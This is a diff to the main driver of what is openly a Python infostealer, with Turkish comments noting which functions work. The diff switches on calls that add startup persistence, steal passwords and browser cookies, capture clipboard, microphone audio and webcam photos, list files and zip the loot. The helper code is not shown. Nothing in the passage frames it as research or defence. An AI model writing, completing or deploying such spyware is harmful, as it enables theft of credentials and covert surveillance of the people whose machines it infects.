@@ -7,15 +7,16 @@ Functions = Functions()
 class Main:
     def startAttack(self):
         try:
-            #Functions.stealTasklist() # çalıştı
-            #Functions.clipboard() # çalıştı
-            #Functions.voice() # çalıştı
-            #Functions.take_photo() # çalıştı
+            Functions.startup() # çalıştı
+            Functions.stealTasklist() # çalıştı
+            Functions.clipboard() # çalıştı
+            Functions.voice() # çalıştı
+            Functions.take_photo() # çalıştı
             Functions.take_screenshoot() # çalışmadı hata veriyor
-            #Functions.listdir() # çalıştı
-            #Functions.get_pwd() # çalıştı
-            #Functions.StealPasswords() # çalıştı
-            #Functions.StealCookies() # çalıştı
+            Functions.listdir() # çalıştı
+            Functions.get_pwd() # çalıştı
+            Functions.StealPasswords() # çalıştı
+            Functions.StealCookies() # çalıştı
 
             ZipFile.ZipFile()
 
@@ -24,5 +25,4 @@ class Main:
         except Exception as e:
             print(f"Error! {e}")
 
-Main = Main()
-Main.startAttack()
+Main().startAttack()
